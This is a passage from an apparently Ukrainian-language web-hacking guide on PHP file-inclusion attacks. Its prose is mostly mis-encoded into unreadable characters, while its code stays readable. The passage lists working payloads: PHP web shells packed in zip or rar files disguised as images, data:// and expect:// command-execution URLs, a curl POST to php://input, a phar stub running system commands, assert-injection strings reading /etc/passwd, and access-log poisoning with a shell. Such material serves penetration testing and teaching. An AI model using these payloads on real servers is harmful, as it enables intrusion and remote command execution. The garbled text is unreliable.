–ü—Ä–æ–¥–æ–≤–∂—É–π—Ç–µ —Ü–µ —Ä–æ–±–∏—Ç–∏, –ø–æ–∫–∏ –Ω–µ –¥–æ—Å—è–≥–Ω–µ—Ç–µ –±–∞–∂–∞–Ω–æ–≥–æ –±—ñ—Ç–∞ –¥–ª—è –≤–∏—Ç–æ–∫—É.

–£ –ø–æ—Å—Ç—ñ —Ç–∞–∫–æ–∂ –±—É–ª–∞ –≤–∏—Ç—ñ–∫–Ω—É—Ç–∞ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü—å–æ–≥–æ: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

–¶–µ–π –æ–±–≥–æ—Ä—Ç–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä—ñ–≤ —Ñ–∞–π–ª—ñ–≤, —è–∫—ñ –ø—Ä–æ—Ü–µ—Å –º–∞—î –≤—ñ–¥–∫—Ä–∏—Ç–∏–º–∏. –ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –≤–º—ñ—Å—Ç—É –≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö —Ñ–∞–π–ª—ñ–≤:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **php://stdin, php://stdout —Ç–∞ php://stderr** –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ **—Ñ–∞–π–ª–æ–≤–∏—Ö –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä—ñ–≤ 0, 1 —Ç–∞ 2** –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ (–Ω–µ –≤–ø–µ–≤–Ω–µ–Ω–∏–π, —è–∫ —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–æ –≤ –∞—Ç–∞—Ü—ñ)

### zip:// —Ç–∞ rar://

–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ —Ñ–∞–π–ª Zip –∞–±–æ Rar –∑ PHPShell –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ç–∞ –æ—Ç—Ä–∏–º–∞–π—Ç–µ –¥–æ –Ω—å–æ–≥–æ –¥–æ—Å—Ç—É–ø.\
–©–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–º rar, –π–æ–≥–æ **–Ω–µ–æ–±—Ö—ñ–¥–Ω–æ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü–µ–π –ø—Ä–æ—Ç–æ–∫–æ–ª –æ–±–º–µ–∂–µ–Ω–∏–π –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è–º–∏ php **`allow_url_open`** —Ç–∞ **`allow_url_include`**

### expect://

Expect –º–∞—î –±—É—Ç–∏ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–æ. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü–µ:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

–í–∫–∞–∂—ñ—Ç—å –≤–∞—à payload —É –ø–∞—Ä–∞–º–µ—Ç—Ä–∞—Ö POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

–§–∞–π–ª `.phar` –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è PHP –∫–æ–¥—É, –∫–æ–ª–∏ –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ñ—É–Ω–∫—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ `include` –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤. –ù–∞–≤–µ–¥–µ–Ω–∏–π –Ω–∏–∂—á–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç PHP –∫–æ–¥—É –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ñ–∞–π–ª—É `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
–©–æ–± —Å–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ —Ñ–∞–π–ª `.phar`, –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ç–∞–∫—É –∫–æ–º–∞–Ω–¥—É:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

–£ –≤–∏–ø–∞–¥–∫–∞—Ö, –∫–æ–ª–∏ LFI –ª–∏—à–µ –≤–∏–∫–æ–Ω—É—î —á–∏—Ç–∞–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ –±–µ–∑ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è PHP-–∫–æ–¥—É –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ, —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ—ó —Ç–∞–∫—ñ —è–∫ `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, –∞–±–æ `filesize()`, –º–æ–∂–Ω–∞ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó. –¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –ø–æ–≤'—è–∑–∞–Ω–∞ –∑ —á–∏—Ç–∞–Ω–Ω—è–º —Ñ–∞–π–ª—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—Ä–æ—Ç–æ–∫–æ–ª—É `phar`.

–î–ª—è –¥–µ—Ç–∞–ª—å–Ω–æ–≥–æ —Ä–æ–∑—É–º—ñ–Ω–Ω—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ `.phar` —Ñ–∞–π–ª—ñ–≤, –∑–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –¥–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞, —â–æ –Ω–∞–≤–µ–¥–µ–Ω–∏–π –Ω–∏–∂—á–µ:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

–ë—É–ª–æ –º–æ–∂–ª–∏–≤–∏–º –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ **–±—É–¥—å-—è–∫–∏–º –¥–æ–≤—ñ–ª—å–Ω–∏–º —á–∏—Ç–∞–Ω–Ω—è–º —Ñ–∞–π–ª—ñ–≤ –∑ PHP, —â–æ –ø—ñ–¥—Ç—Ä–∏–º—É—î php —Ñ—ñ–ª—å—Ç—Ä–∏**, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE. –î–µ—Ç–∞–ª—å–Ω–∏–π –æ–ø–∏—Å –º–æ–∂–Ω–∞ [**–∑–Ω–∞–π—Ç–∏ –≤ —Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
–î—É–∂–µ –∫–æ—Ä–æ—Ç–∫–∏–π –ø—ñ–¥—Å—É–º–æ–∫: **3-–±–∞–π—Ç–æ–≤–∏–π –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è** –≤ –∫—É–ø—ñ PHP –±—É–ª–æ –∑–ª–æ–≤–∂–∏—Ç–æ –¥–ª—è **–∑–º—ñ–Ω–∏ –ª–∞–Ω—Ü—é–≥–∞ –≤—ñ–ª—å–Ω–∏—Ö —á–∞—Å—Ç–∏–Ω** —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–æ–≥–æ —Ä–æ–∑–º—ñ—Ä—É, —â–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ —â–æ –∑–∞–≤–≥–æ–¥–Ω–æ –∑–∞ –±—É–¥—å-—è–∫–æ—é –∞–¥—Ä–µ—Å–æ—é**, —Ç–æ–º—É –±—É–≤ –¥–æ–¥–∞–Ω–∏–π —Ö—É–∫ –¥–ª—è –≤–∏–∫–ª–∏–∫—É **`system`**.\
–ë—É–ª–æ –º–æ–∂–ª–∏–≤–∏–º –≤–∏–¥—ñ–ª—è—Ç–∏ —á–∞—Å—Ç–∏–Ω–∏ —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏—Ö —Ä–æ–∑–º—ñ—Ä—ñ–≤, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –±—ñ–ª—å—à–µ php —Ñ—ñ–ª—å—Ç—Ä–∞–º–∏.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) ‚Äî –ó–∞–ø–∏—Å –≤ –ø–∞–º'—è—Ç—å –∞–±–æ –≤ —Ç–∏–º—á–∞—Å–æ–≤–∏–π —Ñ–∞–π–ª (–Ω–µ –≤–ø–µ–≤–Ω–µ–Ω–∏–π, —è–∫ —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–æ –≤ –∞—Ç–∞—Ü—ñ –Ω–∞ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤)
* [file://](https://www.php.net/manual/en/wrappers.file.php) ‚Äî –î–æ—Å—Ç—É–ø –¥–æ –ª–æ–∫–∞–ª—å–Ω–æ—ó —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏
* [http://](https://www.php.net/manual/en/wrappers.http.php) ‚Äî –î–æ—Å—Ç—É–ø –¥–æ HTTP(s) URL
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) ‚Äî –î–æ—Å—Ç—É–ø –¥–æ FTP(s) URL
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) ‚Äî –ü–æ—Ç–æ–∫–∏ —Å—Ç–∏—Å–Ω–µ–Ω–Ω—è
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) ‚Äî –ó–Ω–∞–π—Ç–∏ —ñ–º–µ–Ω–∞ —à–ª—è—Ö—ñ–≤, —â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å —à–∞–±–ª–æ–Ω—É (–Ω–µ –ø–æ–≤–µ—Ä—Ç–∞—î –Ω—ñ—á–æ–≥–æ, —â–æ –º–æ–∂–Ω–∞ –Ω–∞–¥—Ä—É–∫—É–≤–∞—Ç–∏, —Ç–æ–º—É –Ω–µ –¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–æ —Ç—É—Ç)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) ‚Äî –ó–∞—Ö–∏—â–µ–Ω–∏–π Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) ‚Äî –ê—É–¥—ñ–æ–ø–æ—Ç–æ–∫–∏ (–Ω–µ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤)

## LFI via PHP's 'assert'

Local File Inclusion (LFI) —Ä–∏–∑–∏–∫–∏ –≤ PHP –æ—Å–æ–±–ª–∏–≤–æ –≤–∏—Å–æ–∫—ñ –ø—Ä–∏ —Ä–æ–±–æ—Ç—ñ –∑ —Ñ—É–Ω–∫—Ü—ñ—î—é 'assert', —è–∫–∞ –º–æ–∂–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–¥ —É —Ä—è–¥–∫–∞—Ö. –¶–µ –æ—Å–æ–±–ª–∏–≤–æ –ø—Ä–æ–±–ª–µ–º–∞—Ç–∏—á–Ω–æ, —è–∫—â–æ –≤—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ, —â–æ –º—ñ—Å—Ç—è—Ç—å —Å–∏–º–≤–æ–ª–∏ –ø–µ—Ä–µ—Ö–æ–¥—É –ø–æ –∫–∞—Ç–∞–ª–æ–≥–∞—Ö, —Ç–∞–∫—ñ —è–∫ "..", –ø–µ—Ä–µ–≤—ñ—Ä—è—é—Ç—å—Å—è, –∞–ª–µ –Ω–µ –æ—á–∏—â—É—é—Ç—å—Å—è –Ω–∞–ª–µ–∂–Ω–∏–º —á–∏–Ω–æ–º.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, PHP –∫–æ–¥ –º–æ–∂–µ –±—É—Ç–∏ —Å–ø—Ä–æ–µ–∫—Ç–æ–≤–∞–Ω–∏–π –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è –ø–µ—Ä–µ—Ö–æ–¥—É –ø–æ –∫–∞—Ç–∞–ª–æ–≥–∞—Ö —Ç–∞–∫–∏–º —á–∏–Ω–æ–º:
```bash
assert("strpos('$file', '..') === false") or die("");
```
–•–æ—á–∞ —Ü–µ –º–∞—î –Ω–∞ –º–µ—Ç—ñ –∑—É–ø–∏–Ω–∏—Ç–∏ –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è, —Ü–µ –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ —Å—Ç–≤–æ—Ä—é—î –≤–µ–∫—Ç–æ—Ä –¥–ª—è —ñ–Ω'—î–∫—Ü—ñ—ó –∫–æ–¥—É. –©–æ–± –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü–µ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –≤–º—ñ—Å—Ç—É —Ñ–∞–π–ª—ñ–≤, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
–ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ, –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö —Å–∏—Å—Ç–µ–º–Ω–∏—Ö –∫–æ–º–∞–Ω–¥ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏:
```plaintext
' and die(system("id")) or '
```
–í–∞–∂–ª–∏–≤–æ **URL-–∫–æ–¥—É–≤–∞—Ç–∏ —Ü—ñ payloads**.

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) —Å–µ—Ä–≤–µ—Ä–∞, —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –¥–æ—Å–≤—ñ–¥—á–µ–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ —Ç–∞ —à—É–∫–∞—á–∞–º–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π!

**–Ü–Ω—Å–∞–π—Ç–∏ –∑ —Ö–∞–∫—ñ–Ω–≥—É**\
–ó–∞–ª—É—á–∞–π—Ç–µ—Å—è –¥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É, —è–∫–∏–π –∑–∞–Ω—É—Ä—é—î—Ç—å—Å—è —É –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ —Ö–∞–∫—ñ–Ω–≥—É

**–ù–æ–≤–∏–Ω–∏ –ø—Ä–æ —Ö–∞–∫—ñ–Ω–≥ —É —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ**\
–°–ª—ñ–¥–∫—É–π—Ç–µ –∑–∞ —à–≤–∏–¥–∫–æ–ø–ª–∏–Ω–Ω–∏–º —Å–≤—ñ—Ç–æ–º —Ö–∞–∫—ñ–Ω–≥—É —á–µ—Ä–µ–∑ –Ω–æ–≤–∏–Ω–∏ —Ç–∞ —ñ–Ω—Å–∞–π—Ç–∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ

**–û—Å—Ç–∞–Ω–Ω—ñ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ –Ω–æ–≤–∏—Ö –ø—Ä–æ–≥—Ä–∞–º –≤–∏–Ω–∞–≥–æ—Ä–æ–¥ –∑–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ –≤–∞–∂–ª–∏–≤–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–ª–∞—Ç—Ñ–æ—Ä–º

**–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞** [**Discord**](https://discord.com/invite/N3FrSbmwdy) —ñ –ø–æ—á–Ω—ñ—Ç—å —Å–ø—ñ–≤–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ –ø—Ä–æ–≤—ñ–¥–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!

## PHP Blind Path Traversal

{% hint style="warning" %}
–¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –∞–∫—Ç—É–∞–ª—å–Ω–∞ –≤ –≤–∏–ø–∞–¥–∫–∞—Ö, –∫–æ–ª–∏ –≤–∏ **–∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç–µ** **—à–ª—è—Ö –¥–æ —Ñ–∞–π–ª—É** —Ñ—É–Ω–∫—Ü—ñ—ó **PHP**, —è–∫–∞ **–¥–æ—Å—Ç—É–ø–∞—î—Ç—å—Å—è –¥–æ —Ñ–∞–π–ª—É**, –∞–ª–µ –≤–∏ –Ω–µ –ø–æ–±–∞—á–∏—Ç–µ –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É (—è–∫ –ø—Ä–æ—Å—Ç–∏–π –≤–∏–∫–ª–∏–∫ **`file()`**), –∞–ª–µ –≤–º—ñ—Å—Ç –Ω–µ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î—Ç—å—Å—è.
{% endhint %}

–£ [**—Ü—å–æ–º—É –Ω–µ–π–º–æ–≤—ñ—Ä–Ω–æ–º—É –ø–æ—Å—Ç—ñ**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) –ø–æ—è—Å–Ω—é—î—Ç—å—Å—è, —è–∫ —Å–ª—ñ–ø–∏–π –ø–µ—Ä–µ—Ö—ñ–¥ –ø–æ —à–ª—è—Ö—É –º–æ–∂–µ –±—É—Ç–∏ –∑–ª–æ–≤–∂–∏—Ç–æ —á–µ—Ä–µ–∑ —Ñ—ñ–ª—å—Ç—Ä PHP –¥–ª—è **–µ–∫—Å—Ç—Ä–∞–∫—Ü—ñ—ó –≤–º—ñ—Å—Ç—É —Ñ–∞–π–ª—É —á–µ—Ä–µ–∑ –ø–æ–º–∏–ª–∫–æ–≤–∏–π –æ—Ä–∞–∫—É–ª**.

–£ –ø—ñ–¥—Å—É–º–∫—É, —Ç–µ—Ö–Ω—ñ–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **"UCS-4LE" –∫–æ–¥—É–≤–∞–Ω–Ω—è**, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É —Ç–∞–∫–∏–º **–≤–µ–ª–∏–∫–∏–º**, —â–æ **—Ñ—É–Ω–∫—Ü—ñ—è PHP**, —â–æ –≤—ñ–¥–∫—Ä–∏–≤–∞—î —Ñ–∞–π–ª, –≤–∏–∫–ª–∏—á–µ **–ø–æ–º–∏–ª–∫—É**.

–ü–æ—Ç—ñ–º, —â–æ–± –≤–∏—Ç—è–≥—Ç–∏ –ø–µ—Ä—à–∏–π —Å–∏–º–≤–æ–ª, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —Ñ—ñ–ª—å—Ç—Ä **`dechunk`** —Ä–∞–∑–æ–º –∑ —ñ–Ω—à–∏–º–∏, —Ç–∞–∫–∏–º–∏ —è–∫ **base64** –∞–±–æ **rot13**, –∞ –≤ –∫—ñ–Ω—Ü—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è —Ñ—ñ–ª—å—Ç—Ä–∏ **convert.iconv.UCS-4.UCS-4LE** —Ç–∞ **convert.iconv.UTF16.UTF-16BE**, —â–æ–± **–ø–æ–º—ñ—Å—Ç–∏—Ç–∏ —ñ–Ω—à—ñ —Å–∏–º–≤–æ–ª–∏ –Ω–∞ –ø–æ—á–∞—Ç–∫—É —Ç–∞ –≤–∏—Ç—è–≥—Ç–∏ —ó—Ö**.

**–§—É–Ω–∫—Ü—ñ—ó, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–∏–º–∏**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (—Ç—ñ–ª—å–∫–∏ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –∑ —Ü–∏–º)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

–î–ª—è —Ç–µ—Ö–Ω—ñ—á–Ω–∏—Ö –¥–µ—Ç–∞–ª–µ–π –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∑–≥–∞–¥–∞–Ω–∏–π –ø–æ—Å—Ç!

## LFI2RCE

### –í—ñ–¥–¥–∞–ª–µ–Ω–µ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤

–ü–æ—è—Å–Ω–µ–Ω–æ —Ä–∞–Ω—ñ—à–µ, [**–ø–µ—Ä–µ–π–¥—ñ—Ç—å –∑–∞ —Ü–∏–º –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º**](./#remote-file-inclusion).

### –ß–µ—Ä–µ–∑ —Ñ–∞–π–ª –∂—É—Ä–Ω–∞–ª—É Apache/Nginx

–Ø–∫—â–æ —Å–µ—Ä–≤–µ—Ä Apache –∞–±–æ Nginx **–≤—Ä–∞–∑–ª–∏–≤–∏–π –¥–æ LFI**, –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –≤–∫–ª—é—á–µ–Ω–Ω—è –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **`/var/log/apache2/access.log` –∞–±–æ `/var/log/nginx/access.log`**, –≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ –≤ **user agent** –∞–±–æ –≤ **GET –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ** php shell, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, **`<?php system($_GET['c']); ?>** —ñ –≤–∫–ª—é—á–∏—Ç–∏ —Ü–µ–π —Ñ–∞–π–ª

{% hint style="warning" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **—è–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ –ø–æ–¥–≤—ñ–π–Ω—ñ –ª–∞–ø–∫–∏** –¥–ª—è shell –∑–∞–º—ñ—Å—Ç—å **–æ–¥–∏–Ω–∞—Ä–Ω–∏—Ö –ª–∞–ø–æ–∫**, –ø–æ–¥–≤—ñ–π–Ω—ñ –ª–∞–ø–∫–∏ –±—É–¥—É—Ç—å –∑–º—ñ–Ω–µ–Ω—ñ –Ω–∞ —Ä—è–¥–æ–∫ "_**quote;**_", **PHP –≤–∏–∫–∏–Ω–µ –ø–æ–º–∏–ª–∫—É** —Ç–∞–º —ñ **–Ω—ñ—á–æ–≥–æ —ñ–Ω—à–æ–≥–æ –Ω–µ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ**.

–¢–∞–∫–æ–∂ –ø–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ –≤–∏ **–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ø–∏—Å–∞–ª–∏ payload**, —ñ–Ω–∞–∫—à–µ PHP –±—É–¥–µ –ø–æ–º–∏–ª—è—Ç–∏—Å—è —â–æ—Ä–∞–∑—É, –∫–æ–ª–∏ –Ω–∞–º–∞–≥–∞—Ç–∏–º–µ—Ç—å—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª –∂—É—Ä–Ω–∞–ª—É, —ñ —É –≤–∞—Å –Ω–µ –±—É–¥–µ –¥—Ä—É–≥–æ–≥–æ —à–∞–Ω—Å—É.
{% endhint %}

–¶–µ —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –≤ —ñ–Ω—à–∏—Ö –∂—É—Ä–Ω–∞–ª–∞—Ö, –∞–ª–µ **–±—É–¥—å—Ç–µ –æ–±–µ—Ä–µ–∂–Ω—ñ**, –∫–æ–¥ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∂—É—Ä–Ω–∞–ª—ñ–≤ –º–æ–∂–µ –±—É—Ç–∏ URL-–∫–æ–¥–æ–≤–∞–Ω–∏–π, —ñ —Ü–µ –º–æ–∂–µ –∑–Ω–∏—â–∏—Ç–∏ Shell. –ó–∞–≥–æ–ª–æ–≤–æ–∫ **–∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó "basic"** –º—ñ—Å—Ç–∏—Ç—å "user:password" —É Base64, —ñ –≤—ñ–Ω –¥–µ–∫–æ–¥—É—î—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∂—É—Ä–Ω–∞–ª—ñ–≤. PHPShell –º–æ–∂–µ –±—É—Ç–∏ –≤—Å—Ç–∞–≤–ª–µ–Ω–∏–π —É —Ü–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫.\
